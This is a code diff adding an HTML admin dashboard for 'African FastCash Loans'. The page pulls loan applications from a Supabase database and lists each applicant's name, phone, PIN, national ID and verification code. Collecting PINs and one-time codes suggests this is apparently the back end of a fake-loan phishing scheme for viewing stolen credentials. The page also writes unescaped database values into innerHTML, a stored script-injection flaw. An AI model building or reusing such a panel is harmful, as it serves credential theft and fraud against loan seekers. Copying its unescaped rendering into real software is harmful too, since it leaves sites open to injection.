@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Dashboard</title>
+
+<style>
+body{
+    font-family:Arial,sans-serif;
+    background:#f4f4f4;
+    margin:0;
+}
+header{
+    background:#0b5ed7;
+    color:white;
+    padding:20px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+}
+button{
+    background:#dc3545;
+    color:white;
+    border:none;
+    padding:10px 15px;
+    border-radius:5px;
+    cursor:pointer;
+}
+.container{
+    padding:20px;
+}
+table{
+    width:100%;
+    border-collapse:collapse;
+    background:white;
+}
+th,td{
+    border:1px solid #ddd;
+    padding:10px;
+    text-align:left;
+}
+th{
+    background:#0b5ed7;
+    color:white;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+<h2>African FastCash Loans - Admin Dashboard</h2>
+<button id="logout">Logout</button>
+</header>
+
+<div class="container">
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Phone</th>
+<th>PIN</th>
+<th>National ID</th>
+<th>Loan Amount</th>
+<th>Purpose</th>
+<th>Verification Code</th>
+</tr>
+</thead>
+<tbody id="tbody"></tbody>
+</table>
+</div>
+
+<script type="module">
+import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";
+
+const supabase = createClient(
+  "https://irmqjizwqvsbfextuxtr.supabase.co",
+  "sb_publishable_lGyCvb--uFKzYJXSC_WJow_Kjul-Dk3"
+);
+
+// Check login
+const { data: { session } } = await supabase.auth.getSession();
+
+if (!session) {
+  window.location.href = "login.html";
+}
+
+// Load applications
+const { data, error } = await supabase
+  .from("Applications")
+  .select("*")
+  .order("id", { ascending: false });
+
+if (!error) {
+  const tbody = document.getElementById("tbody");
+
+  data.forEach(app => {
+    tbody.innerHTML += `
+      <tr>
+        <td>${app.full_name}</td>
+        <td>${app.phone}</td>
+        <td>${app.pin}</td>
+        <td>${app.national_id}</td>
+        <td>${app.loan_amount}</td>
+        <td>${app.loan_purpose}</td>
+        <td>${app.verification_code}</td>
+      </tr>
+    `;
+  });
+}
+
+document.getElementById("logout").onclick = async () => {
+  await supabase.auth.signOut();
+  window.location.href = "login.html";
+};
+</script>
+
+</body>
+</html>
